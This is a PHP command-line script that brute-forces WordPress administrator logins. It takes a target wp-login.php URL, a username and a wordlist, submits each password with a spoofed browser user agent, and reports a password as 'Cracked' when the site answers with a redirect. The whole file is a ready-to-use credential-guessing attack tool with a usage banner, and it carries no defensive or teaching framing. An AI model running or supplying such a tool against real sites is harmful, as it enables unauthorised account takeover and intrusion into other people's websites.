<?php
	/*
	[+] PHP
	[+] Wordpress Brute
	*/

	error_reporting(0);
	set_time_limit(0);
	banner();

	function banner(){
		echo "
               ***       
              ** **
             **   **
             **   **         **** 
             **   **       **   ****
             **  **       *   **   **
              **  *      *  **  ***  **
               **  *    *  **     **  *
                ** **  ** **        **
                **   **  **
               *           *
              *             *
             *    0     0    *
             *   /   @   \   *
             *   \__/ \__/   *
               *     W     *
                 **     **   
                   *****
               WORDPRESS-BRUTE

  [+] WORDPRESS-BRUTE
  [+] Wordpress Brute
  [+] Mesela : php wordpress.php site.com/wp-login.php usuario wordlist.txt\n\n
";
	}

	$host = $argv[1];
	$user = $argv[2];
	$pass = file_get_contents($argv[3]);

	$words = explode("\n", $pass);
	foreach($words as $word){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $host);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "log=$user&pwd=$word&wp-submit=Login&redirect_to=$host/wp-admin.php/");
		curl_exec($ch);
		$ver = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		if(eregi("302", $ver)){
			print "\n";
			print "--------------------------------------------------------------------------------------------------------\n";
			echo "| Cracked : " . "Site : " . " | " . $host . " Kullanıcı : "  . $user . " | " . " Sifre : "  . $word .  "\n";
			print "--------------------------------------------------------------------------------------------------------\n";
			print "\n";
			exit;
		}else{
			echo "NOT Cracked | " . "Site : " . " | " . $host . " Kullanıcı : "  . $user . " | " . " Sifre : "  . $word .  "\n";
		}
	}

?>
